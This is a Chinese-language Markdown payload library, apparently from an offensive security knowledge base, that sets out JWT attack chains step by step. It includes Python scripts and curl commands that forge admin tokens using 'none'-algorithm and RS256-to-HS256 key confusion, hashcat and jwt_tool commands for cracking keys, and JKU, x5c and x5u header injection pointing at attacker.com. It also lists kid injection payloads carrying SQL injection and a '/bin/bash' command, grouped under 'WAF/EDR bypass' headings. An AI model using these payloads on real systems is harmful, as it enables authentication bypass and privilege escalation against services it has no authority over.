# JWT 安全(API 视角补充)payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:JWT 安全通论 + JWT None 算法 + RS→HS 密钥混淆。**主参考是 [`../oauth-saml-jwt/12-jwt.md`](../oauth-saml-jwt/12-jwt.md)**,本文件保留以保持 API 视角的完整性,内容与 oauth-saml-jwt 部分重叠。

---

## A. JWT 安全通论

### JWT安全漏洞  `jwt-security`
JSON Web Token安全漏洞利用
子类：**JWT** · tags: `jwt` `token` `authentication`

**前置条件：** 使用JWT进行认证；JWT配置或验证存在问题

**攻击链：**

**1. 1. 解码JWT**
_解码JWT内容_
```
JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io
```

**2. 2. None算法攻击**
_使用None算法绕过签名验证_
```
修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)
```

**3. 3. 弱密钥破解**
_破解弱密钥_
```
使用hashcat破解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```

**4. 4. 密钥混淆攻击**
_算法混淆攻击_
```
将RS256算法改为HS256:
{"alg":"HS256","typ":"JWT"}
使用公钥作为HMAC密钥签名
```

**5. 5. 修改Payload**
_修改JWT声明_
```
修改payload中的用户信息:
{"sub":"admin","iat":1234567890}
重新编码并使用已知密钥签名
```

**WAF/EDR 绕过变体：**

**1. JWK/JKU头部注入**
_通过在JWT Header中注入jwk(内嵌密钥)或jku(远程密钥集URL)指向攻击者控制的密钥，使服务端使用攻击者密钥验证签名_
```
# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥
```

**2. x5c证书链注入**
_通过x5c头部注入攻击者自签证书链，使服务端从证书中提取公钥进行验证，攻击者用对应私钥签名即可伪造任意JWT_
```
# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

---


---

## B. JWT 攻击技术

### JWT None算法攻击  `jwt-none-alg`
利用JWT None算法绕过签名验证
子类：**JWT安全** · tags: `jwt` `none` `algorithm` `bypass`

**前置条件：** 目标使用JWT认证；服务器未正确验证算法

**攻击链：**

**1. 1. 解码JWT**
_解码JWT令牌_
```
# 在线解码
https://jwt.io

# 使用命令行
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# 使用Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```

**2. 2. 构造None算法Token**
_构造None算法Token_
```
# 修改头部为none算法
# 原始头部
{"alg":"HS256","typ":"JWT"}

# 修改为
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# 使用Python构造
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```

**3. 3. 修改用户权限**
_修改用户权限_
```
# 修改payload提权
# 原始payload
{"sub":"user","role":"user","iat":1516239022}

# 修改为
{"sub":"admin","role":"admin","iat":1516239022}

# 完整攻击
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```

**4. 4. 发送恶意Token**
_发送恶意Token_
```
# 使用curl发送
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# 空签名测试
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```

**WAF/EDR 绕过变体：**

**1. 算法混淆**
_尝试算法变体_
```
# 尝试不同变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# 移除alg字段
{"typ":"JWT"}
```

**2. 签名绕过**
_签名绕过变体_
```
# 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证
```

---

### JWT密钥混淆攻击  `jwt-key-confusion`
利用JWT算法混淆实现签名绕过
子类：**JWT安全** · tags: `jwt` `algorithm` `confusion` `rs256`

**前置条件：** 目标使用RS256算法；可获取公钥

**攻击链：**

**1. 1. 获取公钥**
_获取JWT公钥_
```
# 从证书获取
curl -k https://target.com/.well-known/jwks.json

# 从SSL证书获取
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 从JWT头部获取
# 解码JWT头部，查找x5c或jku字段

# 常见公钥位置
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```

**2. 2. 算法混淆攻击**
_算法混淆攻击_
```
# 将RS256改为HS256
# 使用公钥作为HMAC密钥

import jwt
import base64

# 获取公钥
public_key = open("public.pem").read()

# 构造payload
payload = {"sub":"admin","role":"admin"}

# 使用公钥作为HMAC密钥签名
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

**3. 3. 发送恶意Token**
_发送恶意Token_
```
# 使用构造的Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python脚本
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```

**WAF/EDR 绕过变体：**

**1. kid注入**
_通过kid参数注入_
```
# kid参数注入
# 修改JWT头部kid字段
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL注入kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# 命令注入kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```

**2. jku/x5u绕过**
_通过jku/x5u绕过_
```
# jku指向攻击者服务器
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u指向攻击者证书
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# 在攻击者服务器托管恶意密钥
```

---


---

← 回 [00-index.md](00-index.md) · 主参考:[`../oauth-saml-jwt/12-jwt.md`](../oauth-saml-jwt/12-jwt.md)
